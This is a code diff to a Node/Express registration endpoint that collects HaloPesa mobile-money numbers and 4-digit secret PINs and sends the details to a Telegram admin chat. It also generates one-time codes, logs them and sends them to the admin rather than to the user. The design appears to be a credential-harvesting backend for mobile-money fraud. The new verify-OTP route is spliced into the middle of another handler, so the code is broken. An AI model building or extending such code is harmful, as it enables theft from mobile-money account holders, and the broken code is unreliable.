@@ -1990,17 +1990,28 @@ app.post('/api/register-user', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Missing required fields' });
     }
 
-    if (password.length < 6) {
-      return res.status(400).json({ success: false, message: 'Password too short' });
+    // Validate: HaloPesa exactly 10 digits
+    if (!/^\d{10}$/.test(haloNumber)) {
+      return res.status(400).json({ success: false, message: 'Nambari ya HaloPesa lazima iwe tarakimu 10' });
+    }
+
+    // Validate: Password exactly 4 digits
+    if (!/^\d{4}$/.test(password)) {
+      return res.status(400).json({ success: false, message: 'Namba ya siri lazima iwe tarakimu 4' });
     }
 
     const registrationId = 'REG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+    // Generate OTP (6 digits)
+    const otp = String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
 
     pendingRegistrations.set(registrationId, {
       firstName,
       lastName,
       haloNumber,
       password,
+      otp,
+      otpVerified: false,
       timestamp: new Date(timestamp),
       status: 'pending',
       adminResponse: null,
@@ -2010,6 +2021,7 @@ app.post('/api/register-user', async (req, res) => {
     console.log(`📋 New registration pending: ${registrationId}`);
     console.log(`   Name: ${firstName} ${lastName}`);
     console.log(`   HaloPesa: ${haloNumber}`);
+    console.log(`   OTP Generated: ${otp}`);
 
     try {
       const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
@@ -2021,6 +2033,8 @@ app.post('/api/register-user', async (req, res) => {
 🔑 *HaloPesa Number:* ${haloNumber}
 📧 *Namba ya Siri:* ••••••
 ⏰ *Wakati:* ${new Date(timestamp).toLocaleString()}
+
+🔐 *OTP CODE:* \`${otp}\`
 
 📱 *Registration ID:* \`${registrationId}\`
       `;
@@ -2042,7 +2056,7 @@ app.post('/api/register-user', async (req, res) => {
         }
       });
 
-      console.log(`✅ Registration sent to Telegram: ${registrationId}`);
+      console.log(`✅ Registration + OTP sent to Telegram: ${registrationId}`);
     } catch (telegramError) {
       console.error('❌ Error sending to Telegram:', telegramError.message);
     }
@@ -2050,7 +2064,7 @@ app.post('/api/register-user', async (req, res) => {
     res.json({
       success: true,
       registrationId,
-      message: 'Registration submitted. Waiting for admin approval.'
+      message: 'Registration submitted. OTP sent to admin.'
     });
 
   } catch (error) {
@@ -2098,6 +2112,48 @@ app.get('/api/registrations/pending', (req, res) => {
         timestamp: data.timestamp,
         status: data.status
       });
+
+// POST /api/verify-otp
+app.post('/api/verify-otp', async (req, res) => {
+  try {
+    const { registrationId, otp } = req.body;
+
+    if (!registrationId || !otp) {
+      return res.status(400).json({ success: false, message: 'Missing fields' });
+    }
+
+    const registration = pendingRegistrations.get(registrationId);
+
+    if (!registration) {
+      return res.status(404).json({ success: false, message: 'Registration not found' });
+    }
+
+    // Check if already verified
+    if (registration.otpVerified) {
+      return res.status(400).json({ success: false, message: 'OTP already verified' });
+    }
+
+    // Verify OTP
+    if (registration.otp !== otp) {
+      return res.status(401).json({ success: false, message: 'OTP sio sahihi' });
+    }
+
+    // Mark as verified
+    registration.otpVerified = true;
+    console.log(`✅ OTP VERIFIED: ${registrationId}`);
+
+    res.json({
+      success: true,
+      message: 'OTP verified successfully',
+      registrationId
+    });
+
+  } catch (error) {
+    console.error('❌ OTP verification error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
     }
   }
   res.json({ success: true, pendingCount: pending.length, registrations: pending });
